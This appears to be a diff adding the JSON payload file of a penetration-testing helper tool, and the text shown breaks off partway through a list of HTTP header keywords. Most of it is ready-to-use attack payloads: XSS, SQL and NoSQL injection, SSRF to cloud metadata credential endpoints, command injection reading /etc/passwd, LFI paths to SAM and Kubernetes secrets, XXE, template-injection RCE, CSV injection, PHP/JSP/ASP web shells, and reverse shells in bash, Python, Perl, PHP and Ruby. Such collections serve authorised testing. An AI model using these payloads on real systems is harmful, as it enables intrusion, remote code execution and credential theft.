@@ -1,0 +1,2527 @@
+{
+    "categories": [
+        {
+            "name": "XSS",
+            "values": [
+                {
+                    "name": "Fingerprint",
+                    "value": "\"'><h1><i><b>Toto"
+                },
+                {
+                    "name": "Debugger",
+                    "value": "<script>debugger;</script>"
+                },
+                {
+                    "name": "Simple",
+                    "value": "<script>alert(1)</script>"
+                },
+                {
+                    "name": "Classical",
+                    "value": "\"><script>console.log(document.domain)</script>"
+                },
+                {
+                    "name": "IMG",
+                    "value": "<img src=x onerror=alert(1)>"
+                },
+                {
+                    "name": "SVG",
+                    "value": "<svg onload=alert(1)>"
+                },
+                {
+                    "name": "Polyglot 1",
+                    "value": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
+                },
+                {
+                    "name": "Polyglot 2",
+                    "value": "javascript:`//\"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`"
+                },
+                {
+                    "name": "WAF Bypass",
+                    "value": "';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//"
+                },
+                {
+                    "name": "XSS in JS Context",
+                    "value": ";alert(1);//"
+                },
+                {
+                    "name": "CSP Bypass",
+                    "value": "<script/src=//accounts.google.com/o/oauth2/revoke?callback=alert(1337)>"
+                }
+            ]
+        },
+        {
+            "name": "SQLI",
+            "values": [
+                {
+                    "name": "Simple",
+                    "value": "'-- "
+                },
+                {
+                    "name": "",
+                    "value": "' or '1'='1"
+                },
+                {
+                    "name": "",
+                    "value": "' or ''='"
+                },
+                {
+                    "name": "",
+                    "value": "x' or 1=1 or 'x'='y"
+                },
+                {
+                    "name": "",
+                    "value": "') or ('x')=('x"
+                },
+                {
+                    "name": "",
+                    "value": "admin' or '1'='1'#"
+                },
+                {
+                    "name": "",
+                    "value": "admin\") or \"1\"=\"1\"--"
+                },
+                {
+                    "name": "Polyglot Sleep",
+                    "value": "SLEEP(10) /*' or SLEEP(10) or '\" or SLEEP(10) or \"*/"
+                },
+                {
+                    "name": "SQlite Version",
+                    "value": "select sqlite_version();"
+                },
+                {
+                    "name": "BigQuery Project id",
+                    "value": "select @@project_id"
+                },
+                {
+                    "name": "DB2 Version",
+                    "value": "select versionnumber, version_timestamp from sysibm.sysversions;"
+                },
+                {
+                    "name": "MSSQL Version",
+                    "value": "SELECT @@version"
+                },
+                {
+                    "name": "MySQL/PostgreSQL Version",
+                    "value": "SELECT version()"
+                },
+                {
+                    "name": "OracleSQL Version",
+                    "value": "SELECT user FROM dual UNION SELECT * FROM v$version"
+                }
+            ]
+        },
+        {
+            "name": "SSRF",
+            "values": [
+                {
+                    "name": "Simple localhost",
+                    "value": "http://127.0.0.1:80"
+                },
+                {
+                    "name": "Simple with [::]",
+                    "value": "http://[::]:80/"
+                },
+                {
+                    "name": "Simple /8",
+                    "value": "http://127.127.127.127"
+                },
+                {
+                    "name": "Simple octal",
+                    "value": "http://0177.0.0.1/"
+                },
+                {
+                    "name": "Simple IPv6",
+                    "value": "http://[0:0:0:0:0:ffff:127.0.0.1]"
+                },
+                {
+                    "name": "Weak Parser",
+                    "value": "http://127.1.1.1:80\\@127.2.2.2:80/"
+                },
+                {
+                    "name": "Docker",
+                    "value": "http://127.0.0.1:2375/v1.24/containers/json"
+                },
+                {
+                    "name": "Kubernetes",
+                    "value": "http://127.0.0.1:2379/version"
+                },
+                {
+                    "name": "Kubelet",
+                    "value": "http://127.0.0.1:10250/metrics"
+                },
+                {
+                    "name": "Alibaba",
+                    "value": "http://100.100.100.200/latest/meta-data/"
+                },
+                {
+                    "name": "AWS",
+                    "value": "http://169.254.169.254/latest/user-data/"
+                }
+            ]
+        },
+        {
+            "name": "XPATH",
+            "values": [
+                {
+                    "name": "Basic",
+                    "value": "' or '1'='1"
+                },
+                {
+                    "name": "Size of a string",
+                    "value": "and string-length(account)=SIZE_INT"
+                },
+                {
+                    "name": "Extract characters",
+                    "value": "substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)"
+                },
+                {
+                    "name": "Simple",
+                    "value": "x' or 1=1 or 'x'='y"
+                },
+                {
+                    "name": "OOB",
+                    "value": "* and doc('//10.10.10.10/SHARE')"
+                }
+            ]
+        },
+        {
+            "name": "LDAP",
+            "values": [
+                {
+                    "name":"",
+                    "value":"*)(&"
+                },
+                {
+                    "name":"",
+                    "value":"*/*"
+                },
+                {
+                    "name":"",
+                    "value":"*|"
+                },
+                {
+                    "name":"",
+                    "value":"//*"
+                },
+                {
+                    "name":"",
+                    "value":"*))%00"
+                },
+                {
+                    "name":"",
+                    "value":"*/*"
+                },
+                {
+                    "name":"",
+                    "value":"@*"
+                },
+                {
+                    "name":"",
+                    "value":"*)(uid=*))(|(uid=*"
+                },
+                {
+                    "name":"",
+                    "value":"*(|(objectclass=*))"
+                }
+            ]
+        },
+        {
+            "name": "Command Injection",
+            "values": [
+                {
+                    "name": "",
+                    "value": "cat /etc/passwd"
+                },
+                {
+                    "name": "",
+                    "value": "`cat /etc/passwd`"
+                },
+                {
+                    "name": "",
+                    "value": "$(cat /etc/passwd)"
+                },
+                {
+                    "name": "",
+                    "value": "cat$IFS/etc/passwd"
+                },
+                {
+                    "name": "",
+                    "value": "cat${IFS}/etc/passwd"
+                },
+                {
+                    "name": "",
+                    "value": "cat</etc/passwd"
+                },
+                {
+                    "name": "",
+                    "value": "{cat,/etc/passwd}"
+                },
+                {
+                    "name": "No space (Linux)",
+                    "value": "IFS=,;`cat<<<uname,-a`"
+                },
+                {
+                    "name": "No space (Windows)",
+                    "value": "ping%PROGRAMFILES:~10,-5%§IP§",
+                    "prompt": [
+                        "IP"
+                    ]
+                },
+                {
+                    "name": "Line return",
+                    "value": "%0Acat%20/etc/passwd"
+                },
+                {
+                    "name": "Polyglot 1",
+                    "value": "echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}"
+                },
+                {
+                    "name": "Polyglot 2",
+                    "value": "echo 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/"
+                }
+            ]
+        },
+        {
+            "name": "LFI",
+            "values": [
+                {
+                    "name": "Simple",
+                    "values": [
+                        {
+                            "name": "Simple",
+                            "value": "../../../../../../../../../etc/passwd"
+                        },
+                        {
+                            "name": "Null Byte",
+                            "value": "../../../../../../../../../etc/passwd%00"
+                        },
+                        {
+                            "name": "Encoding",
+                            "value": "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+                        },
+                        {
+                            "name": "Double encoding",
+                            "value": "%252e%252e%252fetc%252fpasswd"
+                        },
+                        {
+                            "name": "UTF-8",
+                            "value": "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 1",
+                            "value": "....//....//etc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 2",
+                            "value": "..///////..////..//////etc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 3",
+                            "value": "...//...//etc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 4",
+                            "value": "%252f..%252f..%252f..%252f..%252fetc/passwd"
+                        },
+                        {
+                            "name": "Filter Bypass 3",
+                            "value": "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+                        }
+                    ]
+                },
+                {
+                    "name": "Wrapper",
+                    "values": [
+                        {
+                            "name": "Expect",
+                            "value": "expect://id"
+                        },
+                        {
+                            "name": "PHP - input",
+                            "value": "php://input"
+                        },
+                        {
+                            "name": "PHP - filter read",
+                            "value": "php://filter/read=string.rot13/resource=index.php"
+                        },
+                        {
+                            "name": "PHP - filter read 2",
+                            "value": "php://filter/convert.iconv.utf-8.utf-16/resource=index.php"
+                        },
+                        {
+                            "name": "PHP - filter base64",
+                            "value": "php://filter/convert.base64-encode/resource=index.php"
+                        },
+                        {
+                            "name": "PHP - filter zlib",
+                            "value": "php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd"
+                        },
+                        {
+                            "name": "data - text",
+                            "value": "data://text/plain,<?php phpinfo(); ?>"
+                        },
+                        {
+                            "name": "data - shell cmd parameter",
+                            "value": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="
+                        },
+                        {
+                            "name": "PHP - phar",
+                            "value": "phar://"
+                        },
+                        {
+                            "name": "PHP - zip",
+                            "value": "zip://shell.jpg%23payload.php"
+                        }
+                    ]
+                },
+                {
+                    "name": "Path Traversal",
+                    "values": [
+                        {
+                            "name": "Control Caracters",
+                            "values": [
+                                {
+                                    "name": "",
+                                    "value": "%40"
+                                },
+                                {
+                                    "name": "",
+                                    "value": "%2e"
+                                },
+                                {
+                                    "name": "",
+                                    "value": "%26"
+                                },
+                                {
+                                    "name": "",
+                                    "value": "%3f"
+                                },
+                                {
+                                    "name": "",
+                                    "value": "%23"
+                                }
+                            ]
+                        },
+                        {
+                            "name": "",
+                            "value": "../"
+                        },
+                        {
+                            "name": "",
+                            "value": "..;"
+                        },
+                        {
+                            "name": "",
+                            "value": "..:"
+                        },
+                        {
+                            "name": "",
+                            "value": "%2e%2e/"
+                        },
+                        {
+                            "name": "",
+                            "value": "%2e%2e%2f"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%252f"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e/"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e%252f"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e%252f"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e%252f"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e%252f"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%255c"
+                        },
+                        {
+                            "name": "",
+                            "value": "..\\"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%5c..%5c"
+                        },
+                        {
+                            "name": "",
+                            "value": "%2e%2e\\"
+                        },
+                        {
+                            "name": "",
+                            "value": "%2e%2e%5c"
+                        },
+                        {
+                            "name": "",
+                            "value": "%252e%252e\\"
+                        },
+                        {
+                            "name": "",
+                            "value": "%%252e%252e%255c"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%c0%af"
+                        },
+                        {
+                            "name": "",
+                            "value": "%c0%ae%c0%ae/"
+                        },
+                        {
+                            "name": "",
+                            "value": "%c0%ae%c0%ae%c0%af"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%25c0%25af"
+                        },
+                        {
+                            "name": "",
+                            "value": "..%c1%9c"
+                        },
+                        {
+                            "name": "",
+                            "value": "%uff0e%uff0e%u2215"
+                        },
+                        {
+                            "name": "UNC",
+                            "value": "\\\\localhost\\c$\\windows\\win.ini"
+                        }
+                    ]
+                },
+                {
+                    "name": "/proc",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "/proc/self/environ"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/cmdline"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/stat"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/status"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/fd/0"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/fd/1"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/fd/2"
+                        },
+                        {
+                            "name": "",
+                            "value": "/proc/self/fd/3"
+                        }
+                    ]
+                },
+                {
+                    "name": "Log files",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "/var/log/apache/access.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/apache/error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/vsftpd.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/sshd.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/mail"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/httpd/error_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/usr/local/apache/log/error_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/usr/local/apache2/log/error_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/access_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/access.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/error_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/apache/access_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/apache2/access_log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/apache2/error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/log/httpd/access_log"
+                        }
+                    ]
+                },
+                {
+                    "name" : "Juicy files",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "/var/run/secrets/kubernetes.io/serviceaccount"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/lib/mlocate/mlocate.db"
+                        },
+                        {
+                            "name": "",
+                            "value": "/var/lib/mlocate.db"
+                        }
+
+                    ]
+                },
+                {
+                    "name": "Windows Files",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "C:\\boot.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\WINDOWS\\win.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\WINDOWS\\php.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\WINDOWS\\System32\\Config\\SAM"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\WINNT\\php.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\phpMyAdmin\\config.inc"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\phpMyAdmin\\phpinfo.php"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\phpmyadmin\\config.inc.php"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\apache\\conf\\httpd.conf"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\MercuryMail\\mercury.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\php\\php.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\phpMyAdmin\\config.inc.php"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\tomcat\\conf\\tomcat-users.xml"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\tomcat\\conf\\web.xml"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\sendmail\\sendmail.ini"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\webalizer\\webalizer.conf"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\webdav\\webdav.txt"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\apache\\logs\\error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\apache\\logs\\access.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\FileZillaFTP\\Logs"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\FileZillaFTP\\Logs\\error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\FileZillaFTP\\Logs\\access.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\MercuryMail\\LOGS\\error.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\MercuryMail\\LOGS\\access.log"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\mysql\\data\\mysql.err"
+                        },
+                        {
+                            "name": "",
+                            "value": "C:\\xampp\\sendmail\\sendmail.log"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "name": "RFI",
+            "values": [
+                {
+                    "name": "Simple",
+                    "value": "http://§HOST§/shell.txt",
+                    "prompt": [
+                        "HOST"
+                    ]
+                },
+                {
+                    "name": "Null Byte",
+                    "value": "http://§HOST§/shell.txt%00",
+                    "prompt": [
+                        "HOST"
+                    ]
+                },
+                {
+                    "name": "Double encoding",
+                    "value": "http:%252f%252f§HOST§%252fshell.txt",
+                    "prompt": [
+                        "HOST"
+                    ]
+                }
+            ]
+        },
+        {
+            "name": "XXE",
+            "values": [
+                {
+                    "name": "Simple",
+                    "title": "",
+                    "value": "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>"
+                },
+                {
+                    "name": "Classic 1",
+                    "value": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>"
+                },
+                {
+                    "name": "File",
+                    "value": "<?xml version=\"1.0\"?><!DOCTYPE data [<!ELEMENT data (#ANY)><!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>"
+                },
+                {
+                    "name": "Base64",
+                    "value": "<?xml version=\"1.0\"?><!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>"
+                },
+                {
+                    "name": "PHP Wrapper",
+                    "value": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>"
+                },
+                {
+                    "name": "PHP Wrapper",
+                    "value": "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>"
+                },
+                {
+                    "name": "XInclude",
+                    "value": "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+                }
+            ]
+        },
+        {
+            "name": "SSTI",
+            "values": [
+                {
+                    "name": "Ruby ERB",
+                    "value": "<%= 7*7 %>"
+                },
+                {
+                    "name": "Ruby Slim",
+                    "value": "#{ 7*7 }"
+                },
+                {
+                    "name": "Java",
+                    "value": "${7*7}${{7*7}}"
+                },
+                {
+                    "name": "Twig",
+                    "value": "{{7*7}}"
+                },
+                {
+                    "name": "EL Freemarker 1",
+                    "value": "${1+1}"
+                },
+                {
+                    "name": "EL Freemarker 2",
+                    "value": "#{1+1}"
+                },
+                {
+                    "name": "Jinja2",
+                    "value": "{{4*4}}[[5*5]]"
+                },
+                {
+                    "name": "Jinja2 Read",
+                    "value": "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}"
+                },
+                {
+                    "name": "Jinja2 RCE",
+                    "value": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}"
+                },
+                {
+                    "name": "ASP.NET Razor",
+                    "value": "@(1+2)"
+                },
+                {
+                    "name": "Mako RCE",
+                    "value": "${self.module.cache.util.os.system(\"id\")}"
+                },
+                {
+                    "name": "Java ClassLoader",
+                    "value": "${class.getClassLoader()}"
+                },
+                {
+                    "name": "Java RCE",
+                    "value": "${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"
+                },
+                {
+                    "name": "Ruby RCE",
+                    "value": "<%= system('cat /etc/passwd') %>"
+                }
+            ]
+        },
+        {
+            "name": "Headers",
+            "values": [
+                {
+                    "name": "Bypass",
+                    "value": "X-Custom-IP-Authorization: 127.0.0.1\r\nX-Original-URL: /\r\nX-Rewrite-URL: /\r\nX-Originating-IP: 127.0.0.1\r\nX-Forwarded-For: 127.0.0.1\r\nX-Forwared-Host: 127.0.0.1\r\nX-Remote-IP: 127.0.0.1\r\nX-Client-IP: 127.0.0.1\r\nX-Host: 127.0.0.1"
+                }
+            ]
+        },
+        {
+            "name": "Misc",
+            "values": [
+                {
+                    "name": "CRLF",
+                    "values": [
+                        {
+                            "name": "Default",
+                            "value": "%0D%0A"
+                        },
+                        {
+                            "name": "Cookie",
+                            "value": "%0D%0ASet-Cookie:mycookie=myvalue"
+                        },
+                        {
+                            "name": "Path",
+                            "value": "%0d%0aLocation:%20http://evil.com"
+                        },
+                        {
+                            "name": "UTF-8 Encoding",
+                            "value": "%E5%98%8A%E5%98%8D"
+                        }
+                    ]
+                },
+                {
+                    "name": "Magic Hashes",
+                    "values": [
+                        {
+                            "name": "MD5",
+                            "value": "240610708"
+                        },
+                        {
+                            "name": "SHA1",
+                            "value": "10932435112"
+                        },
+                        {
+                            "name": "SHA256",
+                            "value": "34250003024812"
+                        }
+                    ]
+                },
+                {
+                    "name": "POST Body",
+                    "values": [
+                        {
+                            "name":"JSON",
+                            "value":"Content-Type: application/json\n\n{}"
+                        },
+                        {
+                            "name":"Multipart",
+                            "value":"Content-Type: multipart/form-data; boundary=abcde12345\n\n--abcde12345\nContent-Disposition: form-data; name=\"id\"\n\n1\n--abcde12345\nContent-Disposition: form-data; name=\"file\"; filename=\"image1.png\"\nContent-Type: image/png\n\nAAAA\n--abcde12345--"
+                        },
+                        {
+                            "name":"XML",
+                            "value":"Content-Type: application/xml;charset=UTF-8\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><root>\n<id>1</id>\n</root>\n"
+                        }
+                    ]
+                },
+                {
+                    "name": "Hackvertor Authorization - admin",
+                    "value": "Authorization: Basic <@base64>admin:admin<@/base64>"
+                },
+                {
+                    "name": "Hackvertor Authorization - manager",
+                    "value": "Authorization: Basic <@base64>manager:manager<@/base64>"
+                },
+                {
+                    "name": "Hackvertor Authorization - tomcat",
+                    "value": "Authorization: Basic <@base64>tomcat:tomcat<@/base64>"
+                },
+                {
+                    "name": "",
+                    "value": "test+${4*4}{{4*4}}`id`|'or''='@gmail.com"
+                },
+                {
+                    "name": "S3",
+                    "values": [
+                        {
+                            "name": "Leak",
+                            "value": "%C0"
+                        },
+                        {
+                            "name": "Meta-data 1",
+                            "value": "http://169.254.169.254/latest/meta-data/"
+                        },
+                        {
+                            "name": "Meta-data 2",
+                            "value": "http://169.254.169.254/latest/user-data/"
+                        },
+                        {
+                            "name": "Meta-data 3",
+                            "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/§IAM_USER_ROLE§",
+                            "prompt": [
+                                "§IAM_USER_ROLE§"
+                            ]
+                        },
+                        {
+                            "name": "Meta-data 4",
+                            "value": "http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance"
+                        },
+                        {
+                            "name": "Bucket url 1",
+                            "value": "http://s3.amazonaws.com/§BUCKET_NAME§/",
+                            "prompt": [
+                                "§BUCKET_NAME§"
+                            ]
+                        },
+                        {
+                            "name": "Bucket url 2",
+                            "value": "http://§BUCKET_NAME§.s3.amazonaws.com/",
+                            "prompt": [
+                                "§BUCKET_NAME§"
+                            ]
+                        }
+                    ]
+                },
+                {
+                    "name": "CORS",
+                    "values": [
+                        {
+                            "name": "Evil Origin",
+                            "value": "Origin: https://evil.com"
+                        },
+                        {
+                            "name": "Null Origin",
+                            "value": "Origin: null"
+                        }
+                    ]
+                },
+                {
+                    "name": "CSV injection",
+                    "values": [
+                        {
+                            "name": "",
+                            "value": "DDE (\"cmd\";\"/C calc\";\"!A0\")A0"
+                        },
+                        {
+                            "name": "",
+                            "value": "@SUM(1+1)*cmd|' /C calc'!A0"
+                        },
+                        {
+                            "name": "",
+                            "value": "=2+5+cmd|' /C calc'!A0"
+                        },
+                        {
+                            "name": "",
+                            "value": "=rundll32|'URL.dll,OpenURL calc.exe'!A"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "name": "GraphQL",
+            "values": [
+                {
+                    "name": "Simple",
+                    "value": "{__schema}"
+                },
+                {
+                    "name": "Instrospection",
+                    "value": "__schema{queryType{name},mutationType{name},types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason,},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}},directives{name,description,locations,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue}}}"
+                }
+            ]
+        },
+        {
+            "name": "NOSQL",
+            "values": [
+                {
+                    "name": "Auth Bypass",
+                    "value": "{\"$ne\": null}"
+                },
+                {
+                    "name": "Detection 1",
+                    "value": "{\"$gt\": undefined}"
+                },
+                {
+                    "name": "Detection 2",
+                    "value": "{\"$gt\":\"\"}"
+                },
+                {
+                    "name": "Detection 3",
+                    "value": "{ $ne: 1 }"
+                },
+                {
+                    "name": "Extract Length (URL)",
+                    "value": "username[$regex]=.{1}"
+                },
+                {
+                    "name": "Extract Data (URL)",
+                    "value": "password[$regex]=m.*"
+                },
+                {
+                    "name": "Extract Data (JSON)",
+                    "value": "{\"$regex\": \"^m\"}"
+                },
+                {
+                    "name": "Mongo Payload 1",
+                    "value": "', $where: '1 == 1'"
+                },
+                {
+                    "name": "SQLi in NoSQL",
+                    "value": "';sleep(5000);"
+                }
+            ]
+        },
+        {
+            "name": "CSTI",
+            "values": [
+                {
+                    "name": "AngularJS",
+                    "value" :"{{$on.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "VusJS V2",
+                    "value" :"{{constructor.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "VusJS V3",
+                    "value" :"{{_openBlock.constructor('alert(1)')()}}"
+                },
+                {
+                    "name": "Mayo",
+                    "value" :"[self.alert(1)]"
+                }
+            ]
+        },
+        {
+            "name": "WebShell",
+            "values": [
+                {
+                    "name": "PHP",
+                    "value": "<?php echo shell_exec($_GET['cmd']); ?>"
+                },
+                {
+                    "name": "JSP",
+                    "value": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
+                },
+                {
+                    "name": "ASP",
+                    "value": "<% eval request(\"cmd\") %>"
+                }
+            ]
+        },
+        {
+            "name": "ReverseShell",
+            "values": [
+                {
+                    "name": "Bash TCP",
+                    "value": "bash -i >& /dev/tcp/§IP§/§PORT§ 0>&1",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "Bash UDP",
+                    "value": "sh -i >& /dev/udp/§IP§/§PORT§ 0>&1",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "Python",
+                    "value": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"§IP§\",§PORT§));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "Perl",
+                    "value": "perl -e 'use Socket;$i=\"§IP§\";$p=§PORT§;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "PHP",
+                    "value": "php -r '$s=fsockopen(\"§IP§\",§PORT§);system(\"/bin/sh -i <&3 >&3 2>&3\");'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                },
+                {
+                    "name": "Ruby",
+                    "value": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"§IP§\",\"§PORT§\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
+                    "prompt": [
+                        "IP",
+                        "PORT"
+                    ]
+                }
+            ]
+        }
+    ],
+    "keywords": [
+        {
+            "name": "Headers",
+            "values": [
+                "Authorization: Bearer",
+                "Accept",
+                "Accept-Application",
+                "Accept-Charset",
+                "Accept-Datetime",
+                "Accept-Encoding",
+                "Accept-Encodxng",
+                "Accept-Language",
+                "Accept-Ranges",
+                "Accept-Version",
+                "Access-Control-Allow-Credentials",
+                "Access-Control-Allow-Headers",
+                "Access-Control-Allow-Methods",
+                "Access-Control-Allow-Origin",
+                "Access-Control-Expose-Headers",
+                "Access-Control-Max-Age",
+                "Access-Control-Request-Headers",
+                "Access-Control-Request-Method",
+                "Access-Token",
+                "Accesskey",
+                "Action",
+                "Age",
+                "Ajax",
+                "Allow",
+                "App",
+                "App-Env",
+                "App-Key",
+                "Appcookie",
+                "Appname",
+                "Appversion",
+                "Atcept-Language",
+                "Auth",
+                "Auth-Any",
+                "Auth-Basic",
+                "Auth-Digest",
+                "Auth-Digest-Ie",
+                "Auth-Gssneg",
+                "Auth-Key",
+                "Auth-Ntlm",
+                "Auth-Password",
+                "Auth-Realm",
+                "Auth-Type",
+                "Auth-User",
+                "Authentication",
+                "Authorization",
+                "Bad-Gateway",
+                "Bad-Request",
+                "Base",
+                "Base-Url",
+                "Basic",
+                "Bearer-Indication",
+                "Body-Maxlength",
+                "Body-Truncated",
+                "Browser-User-Agent",
+                "Cache-Control",
+                "Cache-Info",
